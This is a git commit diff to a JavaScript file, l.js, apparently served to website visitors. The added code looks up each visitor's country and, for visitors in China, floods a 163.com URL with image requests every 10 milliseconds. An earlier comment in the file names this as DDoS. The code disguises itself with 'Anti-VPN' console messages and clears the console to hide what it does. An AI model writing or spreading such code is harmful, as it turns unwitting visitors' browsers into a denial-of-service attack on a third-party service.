9a91d15b0acfebd3fc5b579a3d6e2c033ce57b30
甜力怕 <63779340+xiaozhu2007@users.noreply.github.com>
2022-12-22 09:57:35 +0800

    Update l.js

--- l.js
+++ l.js
@@ -1,5 +1,30 @@
-if (window.localStorage.getItem("bypass") != "true") {
-  // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
+setTimeout(function () {
+    console.clear()
+}, 12000);
+
+var xml = new XMLHttpRequest();
+xml.onreadystatechange = function () {
+  if (xml.readyState == 0) {
+    console.log("[Anti-VPN]请求未初始化");
+  }
+  if (xml.readyState == 1) {
+    console.log("[Anti-VPN]服务器连接已建立");
+  }
+  if (xml.readyState == 2) {
+    console.log("[Anti-VPN]请求已接收");
+  }
+  if (xml.readyState == 3) {
+    console.log("[Anti-VPN]请求处理中");
+  }
+  if (xml.readyState == 4) {
+    console.log("[Anti-VPN]请求已完成,且响应已就绪");
+  }
+};
+xml.open("GET", "https://cdn.cyfan.top/cdn-cgi/trace", false);
+xml.send();
+var loc = xml.responseText.split("loc=")[1].split("\n")[0];
+console.info(loc);
+if (loc && loc === "CN") {
   function imgflood() {
     var TARGET =
       "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
@@ -10,24 +35,3 @@ if (window.localStorage.getItem("bypass") != "true") {
     setInterval(imgflood, 10);
   }, 8000);
 }
-setTimeout(function () {
-    console.clear()
-}, 12000);
-
-
-////////////////////////////
-// data.split("loc=")[1].split("\n")[0];
-fetch("https://cdn.cyfan.top/cdn-cgi/trace", {
-  method: "GET",
-  mode: "cors"
-}).then(function(res) {
-  if (res.status === 200) {
-      return res;
-  } else {
-      return Promise.reject(res)
-  }
-}).then(function(data) {
-  console.log(data.split("loc=")[1].split("\n")[0];);
-}).catch(function(err) {
-  console.log(err);
-});
